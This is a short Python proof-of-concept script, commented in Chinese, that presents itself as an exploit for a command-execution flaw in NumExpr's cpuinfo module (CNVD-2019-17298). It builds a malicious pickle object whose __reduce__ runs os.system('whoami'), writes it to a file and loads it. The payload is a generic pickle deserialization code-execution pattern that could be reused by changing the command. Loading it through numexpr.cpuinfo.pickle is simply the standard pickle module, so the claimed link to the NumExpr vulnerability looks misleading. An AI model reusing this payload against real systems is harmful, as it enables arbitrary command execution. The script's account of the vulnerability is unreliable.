import os
import pickle
import numexpr.cpuinfo


# NumExpr 是一个用于加速 NumPy 数组计算的 Python 库。在早期版本中，NumExpr 的 cpuinfo.py 模块存在命令执行漏洞（CNVD-2019-17298），攻击者可能利用该漏洞执行任意系统命令。 


class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('whoami',))

def main():
    # 创建恶意对象
    payload = MaliciousPayload()
    
    # 将恶意对象序列化到文件
    with open('malicious.pkl', 'wb') as f:
        pickle.dump(payload, f)
    
    # 触发漏洞，加载恶意对象
    with open('malicious.pkl', 'rb') as f:
        numexpr.cpuinfo.pickle.load(f)

if __name__ == '__main__':
    main()